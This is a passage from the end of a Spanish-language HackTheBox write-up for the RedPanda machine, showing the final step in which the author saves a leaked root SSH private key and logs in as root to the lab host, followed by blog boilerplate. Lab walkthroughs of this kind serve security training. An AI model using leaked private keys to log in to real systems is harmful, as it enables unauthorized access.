  <span class="nt">&lt;/image&gt;</span>
  <span class="nt">&lt;totalviews&gt;</span>0<span class="nt">&lt;/totalviews&gt;</span>
<span class="nt">&lt;/credits&gt;</span>
</pre></table></code></div></div><p>Tenemos la <code class="language-plaintext highlighter-rouge">id_rsa</code> del usuario <code class="language-plaintext highlighter-rouge">root</code>. La guardamos en un archivo, le damos permisos <code class="language-plaintext highlighter-rouge">600</code> y procedemos a conectarnos como este usuario:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>❯ <span class="nb">chmod </span>600 id_rsa
❯ ssh <span class="nt">-i</span> id_rsa root@10.10.11.170
</pre></table></code></div></div><p>¡Happy Hacking!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/writeup/'>Writeup</a>, <a href='/categories/machines/'>Machines</a>, <a href='/categories/linux/'>Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ssti/" class="post-tag no-text-decoration" >SSTI</a> <a href="/tags/xxe/" class="post-tag no-text-decoration" >XXE</a> <a href="/tags/path-traversal/" class="post-tag no-text-decoration" >Path-Traversal</a> <a href="/tags/spring-boot/" class="post-tag no-text-decoration" >Spring-Boot</a> <a href="/tags/code-analyse/" class="post-tag no-text-decoration" >Code-analyse</a> <a href="/tags/java/" class="post-tag no-text-decoration" >Java</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> Esta entrada está licenciada bajo <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> por el autor.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=WriteUp+RedPanda+HTB+-+rabb1t&url=https%3A%2F%2Frabb1t-0.github.io%2Fposts%2FWriteUp-RedPanda-HTB%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=WriteUp+RedPanda+HTB+-+rabb1t&u=https%3A%2F%2Frabb1t-0.github.io%2Fposts%2FWriteUp-RedPanda-HTB%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Frabb1t-0.github.io%2Fposts%2FWriteUp-RedPanda-HTB%2F&text=WriteUp+RedPanda+HTB+-+rabb1t" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copiar enlace" data-title-succeed="¡Enlace copiado!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Actualizado recientemente</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/burpsuite-socks/">Socks y BurpSuite</a><li><a href="/posts/WriteUp-Undetected-HTB/">WriteUp Undetected HTB</a><li><a href="/posts/WriteUp-Late-HTB/">WriteUp Late HTB</a><li><a href="/posts/WriteUp-TimeLapse-HTB/">WriteUp TimeLapse HTB</a><li><a href="/posts/WriteUp-Noter-HTB/">WriteUp Noter HTB</a></ul></div><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ssti/">SSTI</a> <a class="post-tag" href="/tags/anonimato/">Anonimato</a> <a class="post-tag" href="/tags/attacks-backdoor/">Attacks/Backdoor</a> <a class="post-tag" href="/tags/burpsuite/">BurpSuite</a> <a class="post-tag" href="/tags/chattr/">chattr</a> <a class="post-tag" href="/tags/code-analyse/">Code-analyse</a> <a class="post-tag" href="/tags/command-injection/">command-injection</a> <a class="post-tag" href="/tags/crackmapexec/">crackmapexec</a> <a class="post-tag" href="/tags/cve-2021-23639/">CVE-2021-23639</a> <a class="post-tag" href="/tags/cyberchef/">CyberChef</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contenido</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Lecturas adicionales</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/WriteUp-Late-HTB/"><div class="card-body"> <em class="timeago small" data-ts="1659157200" > 2022-07-30 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>WriteUp Late HTB</h3><div class="text-muted small"><p> Índice Información básica de la máquina Herramientas y recursos empleados Enumeración Explotando la vulnerabilidad SSTI Escalando privilegios Transición de archivos Anal...</p></div></div></a></div><div class="card"> <a href="/posts/WriteUp-Photobomb-HTB/"><div class="card-body"> <em class="timeago small" data-ts="1676091600" > 2023-02-11 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup Photobomb HTB</h3><div class="text-muted small"><p> La máquina photobomb cuenta con un servicio web en el cual hay un panel de autenticación básico, en él podremos registrarnos gracias a unas credenciales que están en la propia web. Después de haber...</p></div></div></a></div><div class="card"> <a href="/posts/WriteUp-Undetected-HTB/"><div class="card-body"> <em class="timeago small" data-ts="1656910800" > 2022-07-04 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>WriteUp Undetected HTB</h3><div class="text-muted small"><p> Índice Información básica de la máquina Herramientas-y-recursos-empleados Fase de enumeración Explotando fallo de PHP Unit (CVE-2017-9841) Privesc steven Privesc root Máquina Undetec...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/WriteUp-Noter-HTB/" class="btn btn-outline-primary" prompt="Anterior"><p>WriteUp Noter HTB</p></a> <a href="/posts/WriteUp-Photobomb-HTB/" class="btn btn-outline-primary" prompt="Nuevo"><p>Writeup Photobomb HTB</p></a></div><script type="text/javascript"> $(function () { const origin = "https://giscus.app"; const iframe = "iframe.giscus-frame"; const lightTheme = "light"; const darkTheme = "dark_dimmed"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } let giscusAttributes = { "src": "https://giscus.app/client.js", "data-repo": "rabb1t-0/rabb1t-0.github.io", "data-repo-id": "R_kgDOHL8JPA", "data-category": "general", "data-category-id": "DIC_kwDOHL8JPM4CPeS9", "data-mapping": "pathname", "data-reactions-enabled": "1", "data-emit-metadata": "0", "data-theme": initTheme, "data-input-position": "top", "data-lang": "en", "crossorigin": "anonymous", "async": "" }; let giscusScript = document.createElement("script"); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value)); document.getElementById("tail-wrapper").appendChild(giscusScript); addEventListener("message", (event) => { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://github.com/rabb1t-0">rabb1t</a>. <span data-toggle="tooltip" data-placement="top" title="Salvo que se indique explícitamente, las entradas de este blog están licenciadas bajo la Creative Commons Attribution 4.0 International (CC BY 4.0) License por el autor.">Algunos derechos reservados.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ssti/">SSTI</a> <a class="post-tag" href="/tags/anonimato/">Anonimato</a> <a class="post-tag" href="/tags/attacks-backdoor/">Attacks/Backdoor</a> <a class="post-tag" href="/tags/burpsuite/">BurpSuite</a> <a class="post-tag" href="/tags/chattr/">chattr</a> <a class="post-tag" href="/tags/code-analyse/">Code-analyse</a> <a class="post-tag" href="/tags/command-injection/">command-injection</a> <a class="post-tag" href="/tags/crackmapexec/">crackmapexec</a> <a class="post-tag" href="/tags/cve-2021-23639/">CVE-2021-23639</a> <a class="post-tag" href="/tags/cyberchef/">CyberChef</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">¡Oops! No se encuentran resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/es.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
